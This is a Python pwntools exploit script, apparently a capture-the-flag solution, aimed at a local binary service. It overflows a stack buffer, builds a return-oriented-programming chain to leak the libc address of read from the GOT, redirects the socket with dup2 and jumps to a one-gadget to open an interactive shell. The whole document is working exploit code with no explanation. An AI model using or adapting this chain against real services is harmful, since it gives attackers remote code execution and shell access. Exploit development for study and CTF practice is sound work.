from pwn import *

fd = 4

libc = ELF("./libc.so.6")
got_read = 0x000000601038
plt_write = 0x00000000004005f0
plt_read = 0x0000000000400630
addr_start = 0x0000000000400690
addr_main = 0x0000000000400777
rop_pop_rbp = 0x004006f8

data = open("a.out", "r").read()

port = 8803
frame_size = (0xff ^ ord(data[0x850])) + 1
if frame_size < 0x10:
    frame_size = (0xffffffff ^ u32(data[0x838:0x838+4])) + 1
size = u32(data[0x83a:0x83a+4])
rop_pop_rdi = 0x00400000 + data.index("\x5f\xc3")
rop_pop_rsi_r15 = rop_pop_rdi - 2
rop_leave = 0x00400000 + data.index("\xc9\xc3")
if size > 0xff:
    size = u32(data[0x840:0x840+4])

p = remote("localhost", port)
print("port = " + str(port))
print("frame size = " + hex(frame_size))
print("read size  = " + hex(size))
print("pop rdi @ " + hex(rop_pop_rdi))
print("pop rsi @ " + hex(rop_pop_rsi_r15))

payload = 'A' * (frame_size - 0x10)
payload += p64(fd)
payload += 'A' * 0x8
payload += p64(0x601078 + 0xf8)
payload += p64(rop_pop_rsi_r15)
payload += p64(0x601078 + 0x100)
payload += p64(0xdeadbeef)
payload += p64(plt_read)
payload += p64(rop_leave)
payload += b'A' * (frame_size - 0x10 + 2 - len(payload))
p.send(payload)
print(repr(p.recv(frame_size - 0x10 + 2)))

payload  = p64(rop_pop_rsi_r15)
payload += p64(got_read)
payload += p64(0xdeadbeef)
payload += p64(plt_write)
payload += p64(rop_pop_rsi_r15)
payload += p64(0x601078 + 0x200)
payload += p64(0xdeadbeef)
payload += p64(plt_read)
payload += p64(rop_pop_rbp)
payload += p64(0x601078 + 0x1f8)
payload += p64(rop_leave)
payload += 'B' * (frame_size - 0x10 + 2 - len(payload))
p.send(payload)
libc_base = u64(p.recv()[:8]) - libc.symbols['read']
print("libc = " + hex(libc_base))

rop_pop_rsi = libc_base + 0x00023e6a
payload  = p64(rop_pop_rsi)
payload += p64(0)
payload += p64(libc_base + libc.symbols['dup2'])
payload += p64(rop_pop_rsi)
payload += p64(1)
payload += p64(libc_base + libc.symbols['dup2'])
payload += p64(libc_base + 0x10a38c)
p.send(payload)

p.interactive()
